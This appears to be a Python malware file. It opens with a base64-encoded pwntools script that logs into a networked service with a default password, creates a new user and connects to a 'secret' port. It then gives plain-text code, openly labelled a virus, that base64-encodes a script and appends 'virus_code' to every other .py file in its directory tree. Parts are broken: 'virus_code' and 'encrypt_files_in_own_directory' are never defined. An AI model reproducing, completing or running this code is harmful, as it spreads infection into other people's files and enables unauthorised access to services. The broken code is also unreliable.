ZnJvbSBwd24gaW1wb3J0ICoKaW1wb3J0IHRpbWUKCmRlZiBtYWluKCk6CiAgICBIT1NUID0gJzE5Mi4xNjguMS43JwogICAgUE9SVCA9IDEyMzQKICAgIFNFQ1JFVF9QT1JUID0gMjAxMDAKCiAgICB0cnk6CiAgICAgICAgY29ubiA9IHJlbW90ZShIT1NULCBQT1JUKQogICAgICAgIHIgPSBjb25uLnJlY3YoKQogICAgICAgIHByaW50KGYiPC0tIHtyfSAiKQoKICAgICAgICBjb25uLnNlbmQoYiJpbml0X21hc3RlclxuIikKICAgICAgICBwcmludChmIi0tPiBpbml0X21hc3RlciIpCgogICAgICAgIHIgPSBjb25uLnJlY3YoKQogICAgICAgIHByaW50KGYiPC0tIHtyfSAiKQoKICAgICAgICBjb25uLnNlbmQoYiJkZWZhdWx0LXBhc3N3b3JkXG4iKQogICAgICAgIHByaW50KGYiLS0+IGRlZmF1bHQtcGFzc3dvcmQgIikKCiAgICAgICAgdGltZS5zbGVlcCgxKSAgIyBXYWl0IGZvciB0aGUgc2VydmVyIHRvIHByb2Nlc3MKCiAgICAgICAgIyBHZXQgSG9zdG5hbWUgUmVzcG9uc2UKICAgICAgICBjb25uLnNlbmQoYiJnZXRfaG9zdG5hbWVcbiIpCiAgICAgICAgciA9IGNvbm4ucmVjdigpCiAgICAgICAgcHJpbnQoZiI8LS0ge3J9ICIpCgogICAgICAgIHRpbWUuc2xlZXAoMSkgICMgV2FpdCBmb3IgdGhlIHNlcnZlciB0byBwcm9jZXNzCgogICAgICAgICMgQ3JlYXRlIFVzZXIgQ29tbWFuZAogICAgICAgIGNvbm4uc2VuZChiImNyZWF0ZV91c2VyXG4iKQogICAgICAgIHIgPSBjb25uLnJlY3YoKQogICAgICAgIHByaW50KGYiPC0tIHtyfSAiKQoKICAgICAgICAjIFByb21wdCB1c2VyIHRvIGlucHV0IG5ldyB1c2VybmFtZSBhbmQgcGFzc3dvcmQKICAgICAgICBuZXdfdXNlcm5hbWUgPSBpbnB1dCgiRW50ZXIgbmV3IHVzZXJuYW1lOiAiKQogICAgICAgIG5ld19wYXNzd29yZCA9IGlucHV0KCJFbnRlciBuZXcgcGFzc3dvcmQ6ICIpCgogICAgICAgICMgU2VuZCB0aGUgbmV3IHVzZXJuYW1lIGFuZCBwYXNzd29yZCB0byB0aGUgc2VydmVyCiAgICAgICAgY29ubi5zZW5kKGYie25ld191c2VybmFtZX1cbiIpCiAgICAgICAgY29ubi5zZW5kKGYie25ld19wYXNzd29yZH1cbiIpCgogICAgICAgIHByaW50KCJVc2VyIGNyZWF0ZWQgc3VjY2Vzc2Z1bGx5ISIpCgogICAgICAgIHRpbWUuc2xlZXAoMikgICMgV2FpdCBmb3IgdGhlIHNlcnZlciB0byBwcm9jZXNzCgogICAgICAgICMgQ29ubmVjdCB0byB0aGUgc2VjcmV0IHNlcnZlciBvbiBwb3J0IDIwMTAwCiAgICAgICAgc2VjcmV0X2Nvbm4gPSByZW1vdGUoSE9TVCwgU0VDUkVUX1BPUlQpCgogICAgICAgICMgUHJvbXB0IHVzZXIgdG8gZW50ZXIgdGhlIG5ldyBjcmVkZW50aWFscyBvbiB0aGUgc2VjcmV0IHNlcnZlcgogICAgICAgIHNlY3JldF9jb25uLnNlbmQoZiJ7bmV3X3VzZXJuYW1lfVxuIikKICAgICAgICBzZWNyZXRfY29ubi5zZW5kKGYie25ld19wYXNzd29yZH1cbiIpCgogICAgICAgIHByaW50KCJDb25uZWN0ZWQgdG8gdGhlIHNlY3JldCBzZXJ2ZXIhIikKCiAgICAgICAgc2VjcmV0X2Nvbm4uY2xvc2UoKQogICAgICAgIGNvbm4uY2xvc2UoKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkFuIGVycm9yIG9jY3VycmVkOiB7ZX0iKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQo=


import os
import base64

def encrypt_script(script_path):
    with open(script_path, 'r') as file:
        script_content = file.read()

    encrypted_script = base64.b64encode(script_content.encode()).decode()

    with open(script_path, 'w') as file:
        file.write(encrypted_script)

def attach_to_other_scripts(virus_path):
    script_directory = os.path.dirname(os.path.abspath(virus_path))

    for root, dirs, files in os.walk(script_directory):
        for file in files:
            if file.endswith('.py') and not file == os.path.basename(virus_path):
                script_path = os.path.join(root, file)
                with open(script_path, 'r') as file:
                    script_content = file.read()
                
                # Check if the virus code is not already present in the script
                if "attach_to_other_scripts" not in script_content:
                    with open(script_path, 'a') as file:
                        file.write('\n\n' + virus_code)

# Usage example
virus_path = os.path.abspath(__file__)
encrypt_files_in_own_directory()
attach_to_other_scripts(virus_path)
